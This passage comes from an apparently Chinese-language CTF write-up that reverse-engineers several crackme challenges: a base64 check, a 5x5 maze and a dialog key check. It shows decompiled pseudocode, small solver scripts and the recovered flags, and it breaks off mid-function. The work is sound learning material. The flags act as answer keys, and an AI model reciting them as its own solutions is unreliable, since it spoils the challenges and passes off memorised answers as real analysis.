class="line">  v10 = 4 * v9;</span><br><span class="line">  *a3 = v10;</span><br><span class="line">  Dst = malloc(v10 + 1);</span><br><span class="line"> <span class="built_in"> if </span>( !Dst )</span><br><span class="line">   <span class="built_in"> return </span>0;</span><br><span class="line">  j_memset(Dst, 0, v10 + 1);</span><br><span class="line">  v13 = a1;</span><br><span class="line">  v11 = a2;</span><br><span class="line">  v7 = 0;</span><br><span class="line">  while ( v11 &gt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    byte_41A144[2] = 0;</span><br><span class="line">    byte_41A144[1] = 0;</span><br><span class="line">    byte_41A144[0] = 0;</span><br><span class="line">    for ( i = 0; i &lt; 3 &amp;&amp; v11 &gt;= 1; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      byte_41A144[i] = *v13;</span><br><span class="line">      --v11;</span><br><span class="line">      ++v13;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="built_in"> if </span>( !i )</span><br><span class="line">      break;</span><br><span class="line">    switch ( i )</span><br><span class="line">    &#123;</span><br><span class="line">      case 1:</span><br><span class="line">        *((_BYTE *)Dst + v7) = aAbcdefghijklmn[(signed int)(unsigned __int8)byte_41A144[0] &gt;&gt; 2];</span><br><span class="line">        v4 = v7 + 1;</span><br><span class="line">        *((_BYTE *)Dst + v4++) = aAbcdefghijklmn[((byte_41A144[1] &amp; 0xF0) &gt;&gt; 4) | 16 * (byte_41A144[0] &amp; 3)];</span><br><span class="line">        *((_BYTE *)Dst + v4++) = aAbcdefghijklmn[64];</span><br><span class="line">        *((_BYTE *)Dst + v4) = aAbcdefghijklmn[64];</span><br><span class="line">        v7 = v4 + 1;</span><br><span class="line">        break;</span><br><span class="line">      case 2:</span><br><span class="line">        *((_BYTE *)Dst + v7) = aAbcdefghijklmn[(signed int)(unsigned __int8)byte_41A144[0] &gt;&gt; 2];</span><br><span class="line">        v5 = v7 + 1;</span><br><span class="line">        *((_BYTE *)Dst + v5++) = aAbcdefghijklmn[((byte_41A144[1] &amp; 0xF0) &gt;&gt; 4) | 16 * (byte_41A144[0] &amp; 3)];</span><br><span class="line">        *((_BYTE *)Dst + v5++) = aAbcdefghijklmn[((byte_41A144[2] &amp; 0xC0) &gt;&gt; 6) | 4 * (byte_41A144[1] &amp; 0xF)];</span><br><span class="line">        *((_BYTE *)Dst + v5) = aAbcdefghijklmn[64];</span><br><span class="line">        v7 = v5 + 1;</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        *((_BYTE *)Dst + v7) = aAbcdefghijklmn[(signed int)(unsigned __int8)byte_41A144[0] &gt;&gt; 2];</span><br><span class="line">        v6 = v7 + 1;</span><br><span class="line">        *((_BYTE *)Dst + v6++) = aAbcdefghijklmn[((byte_41A144[1] &amp; 0xF0) &gt;&gt; 4) | 16 * (byte_41A144[0] &amp; 3)];</span><br><span class="line">        *((_BYTE *)Dst + v6++) = aAbcdefghijklmn[((byte_41A144[2] &amp; 0xC0) &gt;&gt; 6) | 4 * (byte_41A144[1] &amp; 0xF)];</span><br><span class="line">        *((_BYTE *)Dst + v6) = aAbcdefghijklmn[byte_41A144[2] &amp; 0x3F];</span><br><span class="line">        v7 = v6 + 1;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *((_BYTE *)Dst + v7) = 0;</span><br><span class="line"> <span class="built_in"> return </span>Dst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>进去 aAbcdefghijklmn  我们可以看到，基本上很确定就是base64加密函数了</p></blockquote><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.rdata:<span class="number">00417B30</span> aAbcdefghijklmn db 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='</span><br></pre></td></tr></table></figure><blockquote><p>脚本</p></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#coding</span>:utf8</span><br><span class="line">import base64</span><br><span class="line">a=<span class="string">"e3nifIH9b_C@n@dH"</span></span><br><span class="line">b=<span class="string">""</span></span><br><span class="line">c=[]</span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> range(<span class="number">0</span>,len(a)):</span><br><span class="line">b+=(chr(ord(<span class="selector-tag">a</span>[i])-i))</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(b)</span></span>#e2lfbDB2ZV95b3V9</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(base64.b64decode(b)</span></span>)</span><br><span class="line">#&#123;i_l0ve_you&#125;</span><br></pre></td></tr></table></figure><blockquote><p>遇到的问题：Reverse.id2: Permission denied：<br>第一次我是改了 兼容性 就好了 （不是正解获取，但它不是我现在的重点），然后在做下一题时  又遇到了，可能时因为我的电脑用户名是中文，我将文件转到英文目录下 于是可以了</p></blockquote><h1 id="不一样的flag"><a href="#不一样的flag" class="headerlink" title="不一样的flag"></a>不一样的flag</h1><blockquote><p>首先查壳：<br><a href="https://imgchr.com/i/uMTkJe" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/28/uMTkJe.png" alt="uMTkJe.png"></a> 于是想到脱壳，却在OD中找不到  pushad的指令，？？？<br>载入ida也找不到，应该不是壳吧！</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char v3; <span class="regexp">//</span> [esp+<span class="number">17</span>h] [ebp-<span class="number">35</span>h]</span><br><span class="line">  int v4; <span class="regexp">//</span> [esp+<span class="number">30</span>h] [ebp-<span class="number">1</span>Ch]</span><br><span class="line">  int v5; <span class="regexp">//</span> [esp+<span class="number">34</span>h] [ebp-<span class="number">18</span>h]</span><br><span class="line">  signed int v6; <span class="regexp">//</span> [esp+<span class="number">38</span>h] [ebp-<span class="number">14</span>h]</span><br><span class="line">  int i; <span class="regexp">//</span> [esp+<span class="number">3</span>Ch] [ebp-<span class="number">10</span>h]</span><br><span class="line">  int v8; <span class="regexp">//</span> [esp+<span class="number">40</span>h] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  qmemcpy(&amp;v3, _data_start__, <span class="number">25</span>u);             <span class="regexp">//</span> v3= *<span class="number">11110100001010000101111</span><span class="comment">#</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(<span class="string">"you can choose one action to execute"</span>);</span><br><span class="line">    puts(<span class="string">"1 up"</span>);</span><br><span class="line">    puts(<span class="string">"2 down"</span>);</span><br><span class="line">    puts(<span class="string">"3 left"</span>);</span><br><span class="line">    printf(<span class="string">"4 right\n:"</span>);</span><br><span class="line">    scanf(<span class="string">"%d"</span>, &amp;v6);</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="number">2</span> )                              <span class="regexp">//</span> <span class="number">2</span> down v4行++   </span><br><span class="line">    &#123;</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v6 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v6 == <span class="number">3</span> )                            <span class="regexp">//</span> <span class="number">3</span> left   v5列--</span><br><span class="line">      &#123;</span><br><span class="line">        --v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v6 != <span class="number">4</span> )</span><br><span class="line">LABEL_13:</span><br><span class="line">          <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">        ++v5;                                   <span class="regexp">//</span> <span class="number">4</span>   right   v5列++</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">        goto LABEL_13;                          <span class="regexp">//</span> <span class="number">1</span>   up   v4行--</span><br><span class="line">      --v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )                  <span class="regexp">//</span> 循环 <span class="number">2</span>次</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(&amp;v4 + i) &lt; <span class="number">0</span> || *(&amp;v4 + i) &gt; <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)&amp;v8 + <span class="number">5</span> * v4 + v5 - <span class="number">41</span>) == <span class="string">'1'</span> )<span class="regexp">//</span> <span class="number">5</span>*<span class="number">5</span> 矩阵</span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)&amp;v8 + <span class="number">5</span> * v4 + v5 - <span class="number">41</span>) == <span class="string">'#'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(<span class="string">"\nok, the order you enter is the flag!"</span>);</span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这题很简单的迷宫题，v3所指的地址就是一个5*5的迷宫：</p></blockquote><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">*1111</span></span><br><span class="line"><span class="number">01000</span></span><br><span class="line"><span class="number">01010</span></span><br><span class="line"><span class="number">00010</span></span><br><span class="line"><span class="number">1111</span><span class="comment">#    </span></span><br><span class="line"><span class="string">//即只能沿着</span>  <span class="number">0</span> <span class="string">走</span></span><br><span class="line"><span class="string">//下下下友友上上右右下下下</span></span><br><span class="line"><span class="string">//222441144222</span></span><br><span class="line"><span class="string">所以flag:</span>     <span class="string">flag&#123;222441144222&#125;</span></span><br></pre></td></tr></table></figure><p>刮开有奖</p><blockquote><p>参考链接：<a href="https://www.cnblogs.com/Mayfly-nymph/p/11488817.html" target="_blank" rel="noopener">https://www.cnblogs.com/Mayfly-nymph/p/11488817.html</a></p></blockquote><blockquote><p>双击打开没有任何只有一个页面<br>==图片==</p></blockquote><blockquote><p>静态分析下：</p></blockquote><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">BOOL __<span class="function">stdcall <span class="title">DialogFunc</span><span class="params">(HWND hDlg, UINT a2, WPARAM a3, LPARAM a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v5; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+8h] [ebp-20030h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [esp+Ch] [ebp-2002Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+10h] [ebp-20028h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [esp+14h] [ebp-20024h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [esp+18h] [ebp-20020h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [esp+1Ch] [ebp-2001Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [esp+20h] [ebp-20018h]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [esp+24h] [ebp-20014h]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [esp+28h] [ebp-20010h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [esp+2Ch] [ebp-2000Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [esp+30h] [ebp-20008h]</span></span><br><span class="line">  CHAR <span class="keyword">String</span>; <span class="comment">// [esp+34h] [ebp-20004h]</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// [esp+35h] [ebp-20003h]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [esp+36h] [ebp-20002h]</span></span><br><span class="line">  <span class="keyword">char</span> v21; <span class="comment">// [esp+37h] [ebp-20001h]</span></span><br><span class="line">  <span class="keyword">char</span> v22; <span class="comment">// [esp+38h] [ebp-20000h]</span></span><br><span class="line">  <span class="keyword">char</span> v23; <span class="comment">// [esp+39h] [ebp-1FFFFh]</span></span><br><span class="line">  <span class="keyword">char</span> v24; <span class="comment">// [esp+3Ah] [ebp-1FFFEh]</span></span><br><span class="line">  <span class="keyword">char</span> v25; <span class="comment">// [esp+3Bh] [ebp-1FFFDh]</span></span><br><span class="line">  <span class="keyword">char</span> v26; <span class="comment">// [esp+10034h] [ebp-10004h]</span></span><br><span class="line">  <span class="keyword">char</span> v27; <span class="comment">// [esp+10035h] [ebp-10003h]</span></span><br><span class="line">  <span class="keyword">char</span> v28; <span class="comment">// [esp+10036h] [ebp-10002h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">272</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">273</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (_WORD)a3 == <span class="number">1001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;<span class="keyword">String</span>, <span class="number">0</span>, <span class="number">0xFFFF</span>u);</span><br><span class="line">    GetDlgItemTextA(hDlg, <span class="number">1000</span>, &amp;<span class="keyword">String</span>, <span class="number">0xFFFF</span>);<span class="comment">// 我们输入的字符串</span></span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;<span class="keyword">String</span>) == <span class="number">8</span> )                 <span class="comment">// 长度要等于  8</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="string">'Z'</span>;                                 <span class="comment">// 90,74,83,69,67,97,78,72,51,110,103</span></span><br><span class="line">      v8 = <span class="string">'J'</span>;</span><br><span class="line">      v9 = <span class="string">'S'</span>;</span><br><span class="line">      v10 = <span class="string">'E'</span>;</span><br><span class="line">      v11 = <span class="string">'C'</span>;</span><br><span class="line">      v12 = <span class="string">'a'</span>;</span><br><span class="line">      v13 = <span class="string">'N'</span>;</span><br><span class="line">      v14 = <span class="string">'H'</span>;</span><br><span class="line">      v15 = <span class="string">'3'</span>;</span><br><span class="line">      v16 = <span class="string">'n'</span>;</span><br><span class="line">      v17 = <span class="string">'g'</span>;</span><br><span class="line">      sub_4010F0((<span class="keyword">int</span>)&amp;v7, <span class="number">0</span>, <span class="number">10</span>);              <span class="comment">// ZJSECaNH3ng</span></span><br><span class="line">                                                <span class="comment">// 3CEHJNSZagn</span></span><br><span class="line">      <span class="built_in">memset</span>(&amp;v26, <span class="number">0</span>, <span class="number">0xFFFF</span>u);</span><br><span class="line">      v26 = v23;                                <span class="comment">// v26= 经处理后得到字符串的 6-8位</span></span><br><span class="line">      v28 = v25;</span><br><span class="line">      v27 = v24;</span><br><span class="line">      v4 = sub_401000((<span class="keyword">int</span>)&amp;v26, <span class="built_in">strlen</span>(&amp;v26)); <span class="comment">// v4=base64(v26)  =aklw   由下面strcmp(v4,aklw)得到</span></span><br><span class="line">      <span class="built_in">memset</span>(&amp;v26, <span class="number">0</span>, <span class="number">0xFFFF</span>u);</span><br><span class="line">      v27 = v21;</span><br><span class="line">      v26 = v20;</span><br><span class="line">      v28 = v22;                                <span class="comment">// v27= 经处理后得到字符串的3，4，5位</span></span><br><span class="line">      v5 = sub_401000((<span class="keyword">int</span>)&amp;v26, <span class="built_in">strlen</span>(&amp;v26)); <span class="comment">// v5 =base64（v27）=V1Ax  由下面strcmp(v5,V1Ax)得到</span></span><br><span class="line">      <span class="keyword">if</span> ( <span class="keyword">String</span> == v7 + <span class="number">0x22</span>                  <span class="comment">// sub_4010F0函数处理后的第一位为 chr(ord('3')+34)='U'</span></span><br><span class="line">        &amp;&amp; v19 == v11                           <span class="comment">// sub_4010F0函数处理后的第二位为  J</span></span><br><span class="line">        &amp;&amp; <span class="number">4</span> * v20 - <span class="number">141</span> == <span class="number">3</span> * v9</span><br><span class="line">        &amp;&amp; v21 / <span class="number">4</span> == <span class="number">2</span> * (v14 / <span class="number">9</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strcmp</span>(v4, <span class="string">"ak1w"</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strcmp</span>(</span><br><span class="line">              v5,</span><br><span class="line">              <span class="string">"V1Ax"</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        MessageBoxA(hDlg, <span class="string">"U g3t 1T!"</span>, <span class="string">"@_@"</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (_WORD)a3 != <span class="number">1</span> &amp;&amp; (_WORD)a3 != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  EndDialog(hDlg, (<span class="keyword">unsigned</span> __int16)a3);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里有个函数GetDlgItemTextA</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">函数原型：<span class="function"><span class="keyword">int</span> <span class="title">GetDlgItemText</span><span class="params">( HWND hDlg , <span class="keyword">int</span> nID, LPTSTR lpStr, <span class="keyword">int</span> nMaxCount)</span> <span class="keyword">const</span></span>;</span><br><span class="line">具体参考链接：https:<span class="comment">//baike.so.com/doc/6840317-7057592.html</span></span><br></pre></td></tr></table></figure><blockquote><p>这里学到了，当一个函数很麻烦的时候可以尝试用稍稍修改下代码用C跑下</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_4010F0</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">// esi</span></span><br><span class="line">    <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">    <span class="keyword">int</span> v6; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">    result = a3;</span><br><span class="line">    <span class="keyword">for</span> (i = a2; i &lt;= a3; a2 = i)</span><br><span class="line">    &#123;</span><br><span class="line">        v5 = i;</span><br><span class="line">        v6 = a1[i];</span><br><span class="line">        <span class="keyword">if</span> (a2 &lt; result &amp;&amp; i &lt; result)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (v6 &gt;a1[result])</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i &gt;= result)</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    ++i;</span><br><span class="line">                    a1[v5] = a1[result];</span><br><span class="line">                    <span class="keyword">if</span> (i &gt;= result)</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">while</span> (a1[i] &lt;= v6)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> (++i &gt;= result)</span><br><span class="line">                            <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (i &gt;= result)</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    v5 = i;</span><br><span class="line">                    a1[result] = a1[i];</span><br><span class="line">                &#125;</span><br><span class="line">                --result;</span><br><span class="line">            &#125; <span class="keyword">while</span> (i &lt; result);</span><br><span class="line">        &#125;</span><br><span class="line">    LABEL_13:</span><br><span class="line">        a1[result] = v6;</span><br><span class="line">        sub_4010F0(a1, a2, i - <span class="number">1</span>);</span><br><span class="line">        result = a3;</span><br><span class="line">        ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> str[<span class="number">20</span>] = &#123; <span class="number">90</span>,<span class="number">74</span>,<span class="number">83</span>,<span class="number">69</span>,<span class="number">67</span>,<span class="number">97</span>,<span class="number">78</span>,<span class="number">72</span>,<span class="number">51</span>,<span class="number">110</span>,<span class="number">103</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; str &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    sub_4010F0(str, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">11</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; str[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ZJSECaNH3ng</span></span><br><span class="line"><span class="comment">//3CEHJNSZagn</span></span><br></pre></td></tr></table></figure><blockquote><p>sub40100函数猜测是base64加密</p></blockquote><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__cdecl sub_401000(int a1,<span class="built_in"> int </span>a2)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="built_in"> int </span>v2; // eax</span><br><span class="line"> <span class="built_in"> 